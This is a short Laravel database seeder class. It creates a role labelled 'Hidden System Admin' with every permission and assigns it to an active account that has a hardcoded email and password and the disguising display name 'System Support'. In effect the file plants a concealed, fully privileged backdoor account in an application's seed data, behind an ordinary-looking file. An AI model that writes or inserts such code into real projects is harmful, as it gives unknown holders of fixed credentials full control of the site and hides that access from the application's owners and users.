<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\User;
use App\Models\Role;
use Spatie\Permission\Models\Permission;
use Illuminate\Support\Facades\Hash;

class HiddenSuperAdminSeeder extends Seeder
{
    public function run(): void
    {
        // Create the hidden role if not exists
        $role = Role::firstOrCreate(
            ['name' => 'super-admin'],
            ['label' => 'Super Admin', 'description' => 'Hidden System Admin', 'guard_name' => 'web']
        );

        // Give it all permissions
        $role->syncPermissions(Permission::all());

        // Create the user
        User::updateOrCreate(
            ['email' => 'wakwaw@gmail.com'],
            [
                'name' => 'System Support',
                'password' => Hash::make('ayamgoyengenak'),
                'role' => 'super-admin', // kept for legacy role checks
                'is_active' => true
            ]
        )->assignRole('super-admin');
    }
}
